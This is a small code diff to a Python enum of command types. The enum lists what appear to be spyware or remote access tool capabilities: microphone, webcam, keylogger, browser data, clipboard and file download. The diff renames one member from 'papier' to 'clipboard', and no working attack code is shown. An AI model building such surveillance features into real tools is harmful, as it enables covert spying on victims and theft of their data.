@@ -9,7 +9,7 @@ class CommandType(Enum):
     MICROPHONE = "microphone"
     BROWSER_DATA = "browser_data"
     KEYLOGGER = "keylogger"
-    PAPIER = "papier"
+    CLIPBOARD = "clipboard"
     WEBCAM = "webcam"
     DOWNLOAD_FILE = "download_file"
     DIRECTORY_LISTING = "list_directory"
